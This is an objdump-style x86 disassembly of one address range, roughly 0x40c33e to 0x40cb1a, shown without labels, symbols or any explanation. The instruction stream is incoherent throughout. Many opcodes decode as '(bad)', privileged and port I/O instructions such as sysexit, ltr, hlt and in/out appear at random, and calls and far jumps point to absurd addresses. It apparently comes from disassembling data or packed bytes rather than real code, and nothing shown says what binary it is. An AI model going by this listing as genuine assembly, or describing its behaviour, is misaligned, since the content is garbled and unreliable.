  40c33e:	fmul   DWORD PTR [ecx+0x28dd000]
  40c344:	call   0xf8484f0a
  40c349:	rcl    esi,1
  40c34b:	rcl    ebx,0x45
  40c34e:	call   DWORD PTR [eax+0x50]
  40c351:	inc    edx
  40c352:	jne    0x40c357
  40c354:	jmp    DWORD PTR [eax]
  40c356:	sbb    al,0xe8
  40c358:	dec    ebp
  40c359:	or     BYTE PTR [ebx+0x49555400],cl
  40c35f:	mov    ebp,DWORD PTR [ebx]
  40c361:	sbb    BYTE PTR [ebx],al
  40c363:	dec    eax
  40c364:	and    BYTE PTR [ebx],dh
  40c366:	push   eax
  40c367:	add    edi,DWORD PTR [ebx]
  40c369:	cmp    eax,DWORD PTR [eax]
  40c36b:	je     0x40c2f8
  40c36d:	push   ecx
  40c36e:	and    BYTE PTR [ebp-0x79],cl
  40c371:	add    eax,DWORD PTR [ecx]
  40c373:	or     al,0x0
  40c375:	inc    eax
  40c376:	adc    BYTE PTR [ebx],al
  40c378:	inc    ebp
  40c379:	and    bh,bh
  40c37b:	push   eax
  40c37c:	push   esp
  40c37d:	sub    DWORD PTR [ebp+0x0],esi
  40c380:	push   edx
  40c381:	mov    ecx,eax
  40c383:	sbb    BYTE PTR [eax],al
  40c385:	dec    ebp
  40c386:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  40c38c:	add    esi,DWORD PTR [ebx]
  40c38e:	jge    0x72cdcddc
  40c394:	add    DWORD PTR [eax],eax
  40c396:	mov    DWORD PTR [ebp+0x18],edx
  40c399:	mov    DWORD PTR [ebp+0x18],ecx
  40c39c:	cmovne edx,DWORD PTR [eax+0xf]
  40c3a0:	xor    edx,DWORD PTR [edx+0x3]
  40c3a3:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40c3a9:	or     al,0x84
  40c3ab:	rol    DWORD PTR [eax],cl
  40c3ad:	dec    ebp
  40c3ae:	add    BYTE PTR [ebx],bh
  40c3b0:	dec    ebp
  40c3b1:	jbe    0x40c3e6
  40c3b3:	mov    eax,DWORD PTR [ebx]
  40c3b5:	cld    
  40c3b6:	mov    DWORD PTR [edi+0x4d01e0],edx
  40c3bc:	bswap  esi
  40c3be:	push   eax
  40c3bf:	retf   
  40c3c0:	xor    ecx,DWORD PTR [ebp+0x2b]
  40c3c3:	mov    ebp,DWORD PTR [ebx]
  40c3c5:	and    BYTE PTR [ecx],bh
  40c3c7:	or     ah,al
  40c3c9:	daa    
  40c3ca:	xchg   DWORD PTR [edi+0x100],eax
  40c3d0:	push   ebp
  40c3d1:	push   ebp
  40c3d2:	adc    DWORD PTR [edx+0x8],0x55
  40c3d6:	push   ebp
  40c3d7:	xor    ebp,ebx
  40c3d9:	add    ecx,DWORD PTR [ebx+0x40551852]
  40c3df:	dec    DWORD PTR [ebp+0x45ffff54]
  40c3e5:	sbb    al,0x8b
  40c3e7:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  40c3ee:	and    eax,DWORD PTR [ebp+0x3]
  40c3f1:	mov    edx,eax
  40c3f3:	enter  0x8b,0x4
  40c3f7:	mov    eax,DWORD PTR [ebp+0x33]
  40c3fa:	push   eax
  40c3fb:	add    esp,DWORD PTR [edi-0x74f5fff1]
  40c401:	add    ah,bh
  40c403:	add    DWORD PTR [ebp-0x28],0xffffff8b
  40c407:	mov    eax,0xd64f08
  40c40c:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  40c412:	mov    esp,DWORD PTR [esi+0x8]
  40c415:	inc    ebp
  40c416:	dec    eax
  40c417:	mov    eax,0x44f8b
  40c41c:	inc    ebp
  40c41d:	mov    DWORD PTR [ecx-0x38],edx
  40c420:	call   0xc3cbe5
  40c425:	or     BYTE PTR [ebp-0x75],al
  40c428:	mov    esp,DWORD PTR [esi-0x24]
  40c42b:	inc    ebp
  40c42c:	push   ebp
  40c42d:	mov    eax,0x284e83
  40c432:	into   
  40c433:	mov    DWORD PTR [edx+ecx*8-0x31cd7662],ecx
  40c43a:	mov    eax,DWORD PTR [ebp+0xc]
  40c43d:	lea    eax,[ebp+0x45]
  40c440:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40c446:	push   es
  40c447:	xor    eax,esi
  40c449:	mov    edx,0x453bd0
  40c44e:	sub    eax,DWORD PTR [ebx]
  40c450:	mov    edi,edi
  40c452:	loopne 0x40c45c
  40c454:	retf   0x837d
  40c457:	push   es
  40c458:	dec    ebp
  40c459:	mov    DWORD PTR [ebx+0xc78c72],ecx
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	xor    edx,eax
  40c462:	add    esi,DWORD PTR [edx]
  40c464:	mov    DWORD PTR [ebp+0x18],eax
  40c467:	xlat   BYTE PTR ds:[ebx]
  40c468:	dec    ebp
  40c469:	sar    BYTE PTR [ebx],1
  40c46b:	(bad)  
  40c46c:	jne    0x40c422
  40c46e:	mov    esp,eax
  40c470:	fsub   st,st(7)
  40c472:	add    BYTE PTR [ebp-0x73],al
  40c475:	xor    ch,al
  40c477:	out    dx,al
  40c478:	mov    eax,edi
  40c47a:	hlt    
  40c47b:	mov    esp,0xd3d3d0d6
  40c480:	mov    eax,edi
  40c482:	in     al,0xc0
  40c484:	jb     0x40c467
  40c486:	push   ecx
  40c487:	inc    ebp
  40c488:	push   eax
  40c489:	jl     0x40c410
  40c48b:	leave  
  40c48c:	cmove  esi,esp
  40c48f:	lods   al,BYTE PTR ds:[esi]
  40c490:	add    BYTE PTR [eax],dl
  40c492:	mov    esi,edx
  40c494:	or     al,0x80
  40c496:	(bad)  
  40c497:	xor    eax,0x83008801
  40c49c:	or     DWORD PTR [edi],edx
  40c49e:	into   
  40c49f:	in     al,dx
  40c4a0:	retf   
  40c4a1:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40c4a8:	gs push ecx
  40c4aa:	add    BYTE PTR [eax+0x24],dl
  40c4ad:	mov    eax,DWORD PTR [eax]
  40c4af:	fsub   DWORD PTR [esi+0x0]
  40c4b2:	inc    ebp
  40c4b3:	lea    eax,[ebx-0x76aff554]
  40c4b9:	push   ecx
  40c4ba:	(bad)  
  40c4bb:	lea    ebx,[esi]
  40c4bd:	fadd   DWORD PTR [eax]
  40c4bf:	mov    esp,DWORD PTR [esi-0x74]
  40c4c2:	inc    ebp
  40c4c3:	add    BYTE PTR [ebx+0x65ff08ff],al
  40c4c9:	mov    eax,DWORD PTR [eax]
  40c4cb:	fmul   st,st(0)
  40c4cd:	ror    BYTE PTR [ecx-0x45ba33c6],0xeb
  40c4d4:	add    BYTE PTR [ebx-0x27b2769a],cl
  40c4da:	inc    bp
  40c4dc:	inc    ebp
  40c4dd:	je     0x40c46a
  40c4df:	mov    ecx,DWORD PTR [eax]
  40c4e1:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  40c4e5:	add    DWORD PTR [edx+0x0],eax
  40c4e8:	add    BYTE PTR [ecx],dl
  40c4ea:	jmpw   0x14f6
  40c4ee:	or     BYTE PTR [ebx+0x668c00],cl
  40c4f4:	retf   0x453b
  40c4f7:	jne    0x40c47c
  40c4f9:	mov    ecx,DWORD PTR [eax]
  40c4fb:	in     al,0x66
  40c4fd:	(bad)
  40c501:	add    BYTE PTR [ebp+0x52],al
  40c504:	enter  0xee03,0x89
  40c508:	(bad)  
  40c509:	sbb    al,0xb0
  40c50b:	inc    ebp
  40c50c:	jmp    0xea20:0x45ff3357
  40c513:	and    dh,ch
  40c515:	inc    edi
  40c517:	test   DWORD PTR [eax+0x3fc3ed0f],edi
  40c51d:	add    BYTE PTR [ebp-0x1],al
  40c520:	ror    BYTE PTR [esi+ebp*8],1
  40c523:	(bad)  
  40c524:	data16 jne 0x40c56c
  40c527:	call   0x7bd0d
  40c52c:	ret    0x33c0
  40c52f:	test   BYTE PTR [ebp-0x75fff300],cl
  40c535:	inc    ebp
  40c536:	or     BYTE PTR [ebx-0x3015dfb7],0x41
  40c53d:	sub    BYTE PTR [eax],dl
  40c53f:	(bad)  
  40c540:	stc    
  40c541:	test   DWORD PTR [edx+0xf],esi
  40c544:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40c54a:	lea    esi,[ebp-0x3c]
  40c54d:	call   0xff45c051
  40c552:	pop    eax
  40c554:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  40c55b:	xchg   edi,edi
  40c55d:	add    DWORD PTR [eax],ecx
  40c55f:	add    BYTE PTR [ebp+0x55],cl
  40c562:	push   ecx
  40c563:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40c569:	fdiv   DWORD PTR [ecx]
  40c56b:	add    al,dl
  40c56d:	lea    eax,[ebp-0x18]
  40c570:	test   edi,edi
  40c572:	je     0x40c55c
  40c574:	mov    DWORD PTR [ebp+0x8],ecx
  40c577:	dec    DWORD PTR [edx]
  40c579:	push   esp
  40c57a:	add    bh,bh
  40c57c:	inc    ebp
  40c57d:	sbb    al,0x3b
  40c57f:	push   ebp
  40c580:	or     BYTE PTR [ebx+0x50c80d],cl
  40c586:	mov    ecx,DWORD PTR [ebx+0x300338c]
  40c58c:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  40c590:	mov    ecx,DWORD PTR [eax+ebx*1]
  40c593:	inc    ecx
  40c594:	pop    edi
  40c596:	add    DWORD PTR [eax],ecx
  40c598:	add    BYTE PTR [ebp+0x7511f811],ah
  40c59e:	push   ebp
  40c59f:	dec    DWORD PTR [ebx+0xf69014]
  40c5a5:	or     BYTE PTR [ebx+0x11752800],cl
  40c5ab:	adc    DWORD PTR [eax-0x62],0x660c008b
  40c5b2:	push   eax
  40c5b3:	jno    0x40c62a
  40c5b5:	add    ebp,eax
  40c5b7:	push   edx
  40c5b8:	clc    
  40c5b9:	sar    bh,1
  40c5bb:	xchg   eax,eax
  40c5bd:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  40c5c4:	jne    0x40c5d0
  40c5c6:	mov    eax,DWORD PTR [ebp-0x1]
  40c5c9:	mov    esp,DWORD PTR [eax]
  40c5cb:	sub    BYTE PTR [edx+eax*8-0x1],ah
  40c5cf:	rol    BYTE PTR [ebp-0x5174f0bb],1
  40c5d5:	loopne 0x40c5d7
  40c5d7:	dec    ebp
  40c5d8:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  40c5de:	mov    eax,DWORD PTR [eax]
  40c5e0:	call   0xffbebbe5
  40c5e5:	add    al,al
  40c5e7:	add    al,0x84
  40c5e9:	add    BYTE PTR gs:[eax],al
  40c5ec:	add    BYTE PTR [ebp-0x1],al
  40c5ef:	jmp    0x40c611
  40c5f1:	xor    ecx,eax
  40c5f3:	pop    edi
  40c5f4:	call   FWORD PTR [ebx-0x7b]
  40c5f7:	ret    0xf
  40c5fa:	mov    BYTE PTR [ebx+0x518b0f00],cl
  40c600:	mov    WORD PTR [edi],cs
  40c602:	add    BYTE PTR [ecx-0x75],al
  40c605:	push   ebx
  40c606:	and    BYTE PTR [ebx],dh
  40c608:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  40c60e:	add    DWORD PTR [eax+eax*1-0x75],esi
  40c612:	dec    ebp
  40c613:	or     al,0x51
  40c615:	sbb    al,0x75
  40c617:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  40c61d:	pop    eax
  40c61e:	push   edx
  40c61f:	add    edx,DWORD PTR [eax+0x3]
  40c622:	mov    edi,DWORD PTR [ecx]
  40c624:	and    BYTE PTR [eax],cl
  40c626:	xchg   DWORD PTR [edx],ecx
  40c628:	add    eax,eax
  40c62a:	add    BYTE PTR [edi+0x0],al
  40c62d:	cli    
  40c62e:	(bad)  
  40c62f:	loope  0x40c5f4
  40c631:	shl    BYTE PTR [edi],0x5b
  40c634:	dec    ebp
  40c635:	ret    0x8b
  40c638:	sub    BYTE PTR [ebx+0x28358345],cl
  40c63e:	pushf  
  40c63f:	inc    ebp
  40c640:	mov    esi,DWORD PTR ds:0xc7759c08
  40c646:	and    esp,0xf8008557
  40c64c:	inc    DWORD PTR [ebp+0x10]
  40c64f:	xor    eax,esi
  40c651:	pushf  
  40c652:	jb     0x40c60c
  40c654:	add    BYTE PTR [edi+0x9],cl
  40c657:	add    BYTE PTR [esi],dl
  40c659:	mov    edx,eax
  40c65b:	hlt    
  40c65c:	inc    eax
  40c65e:	(bad)  
  40c65f:	data16 rol BYTE PTR [ebp+0x0],1
  40c663:	mov    eax,0x9c4f34
  40c668:	jmp    0x40c5f3
  40c66a:	mov    edi,eax
  40c66c:	or     al,0xc0
  40c66e:	inc    eax
  40c66f:	add    ax,WORD PTR [ebp-0x1]
  40c673:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40c679:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  40c67f:	mov    eax,DWORD PTR [ebp-0x10]
  40c682:	add    DWORD PTR [ecx+0x7830800],edi
  40c688:	sbb    cl,al
  40c68a:	jne    0x40c617
  40c68c:	sub    esp,0x20
  40c68f:	sahf   
  40c690:	mov    esi,DWORD PTR [edx]
  40c692:	and    BYTE PTR [ebx],al
  40c694:	add    dl,BYTE PTR [edi-0x40]
  40c697:	lock pop esi
  40c699:	test   cl,cl
  40c69b:	add    DWORD PTR [eax+eax*1],ebx
  40c69e:	push   ebp
  40c69f:	inc    ebp
  40c6a0:	in     al,dx
  40c6a1:	mov    esi,DWORD PTR [edi-0x483ef918]
  40c6a7:	ret    0xf014
  40c6aa:	push   edi
  40c6ab:	test   bh,bh
  40c6ad:	add    DWORD PTR [eax+eax*1+0x18],eax
  40c6b1:	inc    ebp
  40c6b2:	shl    BYTE PTR [ebx],cl
  40c6b4:	pop    ds
  40c6b5:	add    ecx,DWORD PTR [eax-0x77]
  40c6b8:	(bad)  
  40c6b9:	loopne 0x40c6ec
  40c6bb:	inc    ebp
  40c6bc:	pop    ebp
  40c6bd:	xor    esi,DWORD PTR [edx+0x3]
  40c6c0:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  40c6c6:	fdivp  st(4),st
  40c6c8:	pop    ebp
  40c6c9:	mov    bh,0x72
  40c6cb:	hlt    
  40c6cc:	add    DWORD PTR [edx+0x28],0x0
  40c6d0:	cmp    esp,DWORD PTR [esi+0x72]
  40c6d3:	lock xor eax,DWORD PTR [edx+0x5f]
  40c6d7:	add    BYTE PTR [ebp+0x66],bl
  40c6da:	add    al,0xfb
  40c6dc:	push   ebp
  40c6dd:	or     ah,ch
  40c6df:	add    ah,ch
  40c6e1:	data16 (bad) 
  40c6e3:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  40c6eb:	jge    0x40c721
  40c6ed:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  40c6f4:	test   DWORD PTR [eax+edi*8],esi
  40c6f7:	sbb    si,WORD PTR [ebp+0x0]
  40c6fb:	mov    esp,DWORD PTR [esi-0x24]
  40c6fe:	inc    ebp
  40c6ff:	jge    0x40c684
  40c701:	pushaw 
  40c703:	xor    al,0x89
  40c705:	data16 cld 
  40c707:	jne    0x40c739
  40c709:	mov    esi,0x667200
  40c70e:	inc    ebp
  40c70f:	or     BYTE PTR [ebx-0x76742000],al
  40c715:	lock clc 
  40c717:	mov    eax,DWORD PTR [ebp+0xc]
  40c71a:	mov    edi,esi
  40c71c:	in     al,dx
  40c71d:	or     BYTE PTR [ebp+0x0],al
  40c720:	mov    esi,edi
  40c722:	call   0x53500c62
  40c727:	sbb    dl,BYTE PTR [edi+0x0]
  40c72a:	push   ecx
  40c72b:	mov    esi,DWORD PTR [ebx]
  40c72d:	lock push esi
  40c72f:	pop    ebp
  40c730:	jne    0x40c765
  40c732:	mov    edx,0x3b7203
  40c737:	retw   0x3b7d
  40c73b:	minpd  xmm7,xmm0
  40c73f:	str    WORD PTR [ebp+0x66f0008b]
  40c746:	jne    0x40c727
  40c748:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  40c74f:	mov    esp,esi
  40c751:	cld    
  40c752:	add    BYTE PTR [edx-0x75],al
  40c755:	add    al,dh
  40c757:	sar    bx,0xc2
  40c75b:	mov    eax,DWORD PTR [ebp+0x8]
  40c75e:	mov    eax,DWORD PTR [ebx]
  40c760:	lock rcr di,0xc2
  40c765:	es inc ebp
  40c767:	mov    ecx,DWORD PTR [edi]
  40c769:	clc    
  40c76a:	jne    0x40c7ae
  40c76c:	(bad)  
  40c76e:	jge    0x40c7d6
  40c770:	mov    eax,0x8b8afb
  40c775:	or     BYTE PTR [ebx],dh
  40c777:	add    edi,DWORD PTR [ebx+0xdf8a66]
  40c77d:	push   cs
  40c77e:	xor    esi,DWORD PTR [edi-0x48c4f748]
  40c784:	add    ah,dh
  40c786:	add    edi,ebx
  40c788:	mov    ax,di
  40c78b:	or     dh,bh
  40c78d:	mov    ecx,DWORD PTR [ecx+0x7542f4fc]
  40c793:	add    BYTE PTR [ebx-0x7404139a],cl
  40c799:	mov    esi,DWORD PTR [edi+0xc]
  40c79c:	mov    DWORD PTR [ebx],eax
  40c79e:	or     BYTE PTR [esi+0x75],ah
  40c7a1:	fisttp WORD PTR [ebx-0x747417da]
  40c7a7:	clc    
  40c7a8:	ja     0x40c7ec
  40c7aa:	mov    DWORD PTR [eax],eax
  40c7ac:	or     al,0x66
  40c7ae:	sahf   
  40c7af:	sti    
  40c7b0:	add    BYTE PTR [ebx+0x3010ce9],cl
  40c7b6:	add    BYTE PTR [esi+0x7d],ah
  40c7b9:	fbld   TBYTE PTR [esi+0xe]
  40c7bc:	pop    ebp
  40c7bd:	mov    bh,0x81
  40c7bf:	or     al,0x57
  40c7c1:	mov    bh,0x0
  40c7c3:	hlt    
  40c7c4:	add    edi,ebx
  40c7c6:	mov    di,bx
  40c7c9:	or     al,0x84
  40c7cb:	mov    eax,DWORD PTR [ecx]
  40c7cd:	or     al,0x0
  40c7cf:	mov    edi,DWORD PTR [ebp+0x8]
  40c7d2:	mov    edi,DWORD PTR [ebx]
  40c7d4:	adc    BYTE PTR [edi],cl
  40c7d6:	stc    
  40c7d7:	mov    ebx,0x8bdf00fa
  40c7dc:	mov    ebx,eax
  40c7de:	or     al,0x5d
  40c7e0:	mov    esi,DWORD PTR [ebx]
  40c7e2:	or     BYTE PTR [ebp+0x72001f84],cl
  40c7e8:	add    BYTE PTR [eax],al
  40c7ea:	cmp    edi,DWORD PTR [ebp+0xf]
  40c7ed:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  40c7f3:	xor    edi,DWORD PTR [ebp-0x73]
  40c7f6:	mov    ebx,0x728a1f
  40c7fb:	add    BYTE PTR [ebx],dh
  40c7fd:	jge    0x40c865
  40c7ff:	mov    ebx,DWORD PTR [ebp-0x20]
  40c802:	pop    bp
  40c804:	clc    
  40c805:	cmp    di,WORD PTR [edx+esi*2]
  40c809:	data16 data16 jge 0x40c88a
  40c80d:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  40c813:	xor    di,WORD PTR [esi+eiz*2]
  40c817:	pop    bp
  40c819:	jge    0x40c881
  40c81b:	mov    edi,eax
  40c81d:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  40c824:	jge    0x40c82e
  40c826:	ltr    WORD PTR [ebp-0x2]
  40c82a:	add    edi,DWORD PTR [ebx]
  40c82c:	hsubpd xmm4,xmm0
  40c830:	data16 (bad) 
  40c832:	jge    0x40c7bf
  40c834:	mov    ebx,0xf18ae4
  40c839:	dec    ebp
  40c83a:	xor    eax,DWORD PTR [ebx]
  40c83c:	minpd  xmm6,xmm1
  40c840:	data16 jne 0x40c83b
  40c843:	jmp    0x40c880
  40c845:	mov    esi,DWORD PTR [edx-0x10]
  40c848:	sar    WORD PTR [ebp+0x4d],1
  40c84c:	mov    ebx,0xa8a8d
  40c851:	jb     0x40c886
  40c853:	add    BYTE PTR [esi+0x4d],ah
  40c856:	pop    ebp
  40c857:	mov    esp,DWORD PTR [esi-0x20]
  40c85a:	clc    
  40c85b:	jne    0x40c898
  40c85d:	data16 ja 0x40c894
  40c860:	jnp    0xf1502ee3
  40c866:	pop    ebp
  40c867:	inc    edx
  40c868:	add    eax,DWORD PTR [eax]
  40c86a:	data16 data16 jge 0x40c860
  40c86e:	mov    dx,0x7d
  40c872:	data16 pop bp
  40c875:	icebp  
  40c876:	sbb    di,bx
  40c879:	jne    0x40c800
  40c87b:	mov    eax,DWORD PTR [eax]
  40c87d:	call   0x77be5382
  40c882:	mov    ebp,DWORD PTR [ebx]
  40c884:	in     al,dx
  40c885:	data16 stc 
  40c887:	repnz mov esp,0x32759e3b
  40c88d:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  40c893:	inc    eax
  40c894:	mov    eax,DWORD PTR [edi]
  40c896:	call   0xbc74c1e0
  40c89b:	add    ebx,DWORD PTR [esi-0x76a4cda1]
  40c8a1:	ret    0xe8
  40c8a4:	jge    0x40c831
  40c8a6:	mov    edx,DWORD PTR [ecx-0x14]
  40c8a9:	mov    ecx,DWORD PTR [ebx-0x76f784aa]
  40c8af:	add    BYTE PTR [eax],cl
  40c8b1:	data16 jge 0x40c882
  40c8b4:	mov    eax,DWORD PTR [edx-0x18]
  40c8b7:	add    BYTE PTR [ebx-0x7631849a],cl
  40c8bd:	mov    edx,0xc77d000c
  40c8c2:	data16 cld 
  40c8c4:	pop    ebp
  40c8c5:	test   DWORD PTR [ecx+0x3557f8],eax
  40c8cb:	pushf  
  40c8cc:	add    esp,DWORD PTR [esi+0x66]
  40c8cf:	into   
  40c8d0:	fistp  WORD PTR [ebp-0x7b]
  40c8d3:	push   edi
  40c8d4:	(bad)  
  40c8d5:	mov    bh,0xff
  40c8d7:	mov    edi,0xff338d75
  40c8dc:	mov    edx,DWORD PTR [edi-0x10]
  40c8df:	push   ecx
  40c8e0:	repnz mov ebx,0x894faf
  40c8e6:	lock cmp edx,DWORD PTR [edx]
  40c8e9:	jne    0x40c940
  40c8eb:	mov    DWORD PTR [ebx],esi
  40c8ed:	cld    
  40c8ee:	mov    edx,DWORD PTR [edi-0x1c]
  40c8f1:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339e]
  40c8f8:	mov    DWORD PTR [esp+eiz*8-0x749baac4],ecx
  40c8ff:	mov    ebx,0x8b3bec
  40c904:	push   esi
  40c905:	sub    ecx,eax
  40c907:	mov    ebx,0xba8a2b
  40c90c:	mov    dh,BYTE PTR [ebx]
  40c90e:	add    BYTE PTR [ebx+0xb94e33],bh
  40c914:	dec    esi
  40c915:	cmp    eax,DWORD PTR [eax]
  40c917:	jne    0x40c954
  40c919:	mov    esi,DWORD PTR [ebp-0x4]
  40c91c:	mov    ebx,DWORD PTR [ebx-0x24]
  40c91f:	stc    
  40c920:	jge    0x40c8a7
  40c922:	data16 clc 
  40c924:	xor    al,0x9
  40c926:	data16 into 
  40c928:	lock test BYTE PTR [ebx],dh
  40c92b:	ds data16 fs icebp 
  40c92f:	pop    esi
  40c930:	add    al,0xc3
  40c932:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40c939:	inc    ebp
  40c93a:	mov    esi,DWORD PTR [esi]
  40c93c:	in     al,0x9c
  40c93e:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40c945:	pop    ebx
  40c946:	or     al,0xff
  40c948:	push   ebp
  40c949:	mov    ebp,esp
  40c94b:	mov    ah,BYTE PTR [esi+0x4]
  40c94e:	or     BYTE PTR [esi+edi*4],dh
  40c951:	cmp    al,0x3b
  40c953:	je     0x40c955
  40c955:	mov    ebp,DWORD PTR [ebx]
  40c957:	mov    edx,0xff8a8dbe
  40c95c:	add    BYTE PTR [edi+0x33],dl
  40c95f:	push   ecx
  40c960:	mov    esi,0x8b4e53
  40c965:	mov    ebx,0x363b45
  40c96a:	pushf  
  40c96b:	sub    edi,DWORD PTR [edx-0x7757a45]
  40c971:	add    BYTE PTR [ebx],bh
  40c973:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40c977:	dec    edi
  40c978:	str    ecx
  40c97b:	cmp    esp,DWORD PTR [edx+0x75]
  40c97e:	int    0x89
  40c980:	mov    esi,0x77208fc
  40c985:	xor    edx,DWORD PTR [esi]
  40c987:	mov    eax,DWORD PTR [eax]
  40c989:	xor    esp,DWORD PTR [esi-0x73]
  40c98c:	retf   
  40c98d:	push   edi
  40c98e:	add    esp,ebp
  40c990:	push   ebp
  40c991:	add    BYTE PTR [ebp-0x293cfee8],cl
  40c997:	cmp    dl,0x49
  40c99a:	(bad)  
  40c99b:	sti    
  40c99c:	mov    esi,DWORD PTR [ebp+0x78]
  40c99f:	mov    esp,ebp
  40c9a1:	cld    
  40c9a2:	add    BYTE PTR ds:0xf8008508,bh
  40c9a8:	data16 or al,0xcb
  40c9ab:	rol    DWORD PTR [edx-0x37],0x0
  40c9af:	mov    DWORD PTR [esi+0x47],esp
  40c9b2:	retf   
  40c9b3:	in     eax,0xba
  40c9b5:	add    BYTE PTR [eax],al
  40c9b7:	(bad)  
  40c9b8:	pop    si
  40c9ba:	retf   
  40c9bb:	ret    
  40c9bc:	enter  0x4d8b,0x51
  40c9c0:	pop    edi
  40c9c1:	mov    DWORD PTR [ecx-0x637ac904],0x333574f8
  40c9cb:	pushf  
  40c9cc:	(bad)  
  40c9cd:	call   0x26c81a
  40c9d2:	add    BYTE PTR [ebx+0x3b55bac9],cl
  40c9d8:	in     al,dx
  40c9d9:	add    BYTE PTR [esi+0x2b],dl
  40c9dc:	(bad)  
  40c9dd:	mov    edx,0x858afc
  40c9e2:	clc    
  40c9e3:	xor    esi,DWORD PTR ds:0xe84e9cba
  40c9e9:	add    bh,bh
  40c9eb:	cmp    edi,edi
  40c9ed:	je     0x40c9e7
  40c9ef:	push   ebx
  40c9f0:	pop    es
  40c9f1:	sysexit 
  40c9f3:	leave  
  40c9f4:	dec    ecx
  40c9f5:	bound  edi,QWORD PTR [ebp+ecx*8+0x61]
  40c9f9:	mov    edi,0x76208c7
  40c9fe:	int    0x64
  40ca00:	mov    ecx,0x7660800
  40ca05:	retf   
  40ca06:	add    ax,WORD PTR [eax]
  40ca09:	jne    0x40ca13
  40ca0b:	lea    eax,[eax]
  40ca0d:	add    DWORD PTR [esi-0x9],esp
  40ca10:	ret    
  40ca11:	(bad)  
  40ca12:	inc    edx
  40ca13:	xlat   BYTE PTR ds:[ebx]
  40ca14:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  40ca1a:	add    BYTE PTR fs:[eax],al
  40ca1d:	or     BYTE PTR [esi+0x0],ah
  40ca20:	ret    
  40ca21:	add    cx,bx
  40ca24:	jne    0x40ca68
  40ca26:	lea    eax,[eax]
  40ca28:	add    DWORD PTR [esi-0xf],esp
  40ca2b:	retf   
  40ca2c:	(bad)  
  40ca2d:	mov    edx,0x668400d1
  40ca32:	cmp    al,0xcb
  40ca34:	fs enter 0x7d8a,0x80
  40ca39:	ss xor eax,0x805ff39c
  40ca3f:	je     0x40cabd
  40ca41:	xor    eax,ebx
  40ca43:	inc    eax
  40ca44:	inc    ebp
  40ca45:	add    bl,BYTE PTR [ebx-0x40]
  40ca48:	ss leave 
  40ca4a:	pushf  
  40ca4b:	push   ebp
  40ca4c:	je     0x40ca3a
  40ca4e:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  40ca54:	mov    WORD PTR [esi+0x3c],ss
  40ca57:	and    DWORD PTR [esp+eax*8-0x75],0xc9425fff
  40ca5f:	add    BYTE PTR [ebp+0x57],dl
  40ca62:	in     al,dx
  40ca63:	(bad)  
  40ca64:	push   esi
  40ca65:	mov    edx,0x89360045
  40ca6a:	pushf  
  40ca6b:	cld    
  40ca6c:	mov    esi,0xf874853b
  40ca71:	mov    edx,edx
  40ca73:	or     bh,bh
  40ca75:	ret    0x4566
  40ca78:	or     bl,ch
  40ca7a:	or     BYTE PTR [ebx-0x7699f800],cl
  40ca80:	retf   0x4283
  40ca83:	add    al,BYTE PTR [eax]
  40ca85:	mov    bh,0x66
  40ca87:	adc    dl,cl
  40ca89:	iret   
  40ca8a:	mov    edx,0x66c400c7
  40ca8f:	dec    edx
  40ca91:	(bad)  
  40ca92:	push   edi
  40ca93:	mov    edx,0x66b70057
  40ca98:	mov    edx,0xffdf8df8
  40ca9d:	rcl    BYTE PTR [edi+0x66],0x51
  40caa1:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40caa7:	ret    0x3b
  40caaa:	jne    0x40ca37
  40caac:	mov    DWORD PTR [ebx+0x457218fc],eax
  40cab2:	xor    esi,DWORD PTR ds:0xc7339c8b
  40cab8:	callw  0x5048
  40cabc:	cmp    al,0xf8
  40cabe:	fs inc ebp
  40cac0:	mov    ebx,0x83b35
  40cac5:	pop    es
  40cac6:	sub    ebx,DWORD PTR [esi-0x7675cd45]
  40cacc:	add    al,bh
  40cace:	xor    eax,DWORD PTR [ebp-0x45]
  40cad1:	cmp    eax,0xc7009c4e
  40cad6:	cmp    esi,esp
  40cad8:	jne    0x40ca5f
  40cada:	cmp    eax,0x338545fc
  40cae0:	clc    
  40cae1:	pushf  
  40cae2:	pop    ebx
  40cae3:	mov    eax,DWORD PTR ds:0xeb57c0ec
  40cae9:	push   ecx
  40caea:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  40caf0:	mov    ebx,DWORD PTR [esi-0x74bacdaf]
  40caf6:	psubsb mm1,QWORD PTR [eax]
  40caf9:	icebp  
  40cafa:	lea    ecx,[eax]
  40cafc:	clc    
  40cafd:	pop    es
  40cafe:	inc    ecx
  40cb00:	mov    esi,0x8a72
  40cb05:	push   ebp
  40cb06:	xor    ecx,DWORD PTR [edi]
  40cb08:	mov    edi,0xc24ed1
  40cb0d:	adc    DWORD PTR [ebp+0x0],0x66
  40cb11:	add    bh,al
  40cb13:	inc    ebp
  40cb14:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  40cb1a:	mov    DWORD PTR [ebp+0x8],ecx
